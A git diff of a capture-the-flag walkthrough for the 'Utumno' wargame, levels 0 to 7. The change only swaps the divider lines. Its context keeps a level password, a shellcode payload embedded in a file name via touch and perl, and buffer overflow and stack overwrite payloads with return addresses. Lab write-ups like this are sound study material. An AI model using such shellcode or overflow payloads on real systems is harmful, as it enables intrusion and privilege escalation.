@@ -1,4 +1,5 @@
-############################################### Utumno ############################################
+
+――――――――――――――――――――――――――――――――――――――――――――――[ Utumno ]――――――――――――――――――――――――――――――――――――――――――――
 
 Level:     0
 Exploit:   LD_PRELOAD Memory Leaking
@@ -38,7 +39,7 @@ the custom puts implementation to printf("%c", <addr>) for all user space addres
 Read me! :P
 password: ytvWa6DzmL
 
-###################################################################################################
+――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
 
 Level:    1
 Exploit:  Reverse Engineering & Shellcoding
@@ -83,7 +84,7 @@ touch sh_$(perl -e 'print "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80
 \x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54
 \x8a\xe2\xce\x81"')
 
-###################################################################################################
+――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
 
 Level:    2
 Exploit:  Memory corruption from argc = 0
@@ -187,7 +188,7 @@ Finalize program to execute priviledge execution
     return 0;
   }
 
-###################################################################################################
+――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
 
 Level:    3
 Exploit:  buffer overflow
@@ -252,7 +253,7 @@ Address of the EXPLOIT environment var is found 0xffffd3df. Set this address to 
 return address. Exploit below uses 0xffffd500
 perl -e 'print "\x24\x00\x26\xd5\x20\xff\x2e\xff"' | ./utumno3
 
-###################################################################################################
+――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
 
 Level:    4
 Exploit:  buffer overflow
@@ -306,7 +307,7 @@ Using gdb, EXPLOIT environment variable was found at: 0xffffd55e
 After playing around with slightly varying return addresses, the following exploit worked
 $ ./utumno4 65536 $(perl -e 'print "\x41"x65286 . "\x50\xd5\xff\xff"x4 . "\x43"x246')
 
-###################################################################################################
+――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
 
 Level:    5
 Exploit:  buffer overflow
@@ -380,7 +381,7 @@ The final program which gives immediate priviledge escalation
     return 0;
   }
 
-###################################################################################################
+――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
 
 Level:    6
 Exploit:  stack overwrite
@@ -431,7 +432,7 @@ ret val addr: 0xffffcf4c
 exploit env var: 0xffffd1d9
 $ ./utumno6 -1 0xffffcf6c $(perl -e 'print "\xf0\xd1\xff\xff"')
 
-###################################################################################################
+――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
 
 Level:    7
 Exploit:  buffer overflow/stack pivoting
@@ -510,5 +511,5 @@ The following works in gdb.
 
 Because of stack shifting, we will need to slightly adjust the FAKE EBP and FAKE EIP value.
 
-###################################################################################################
+――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
 
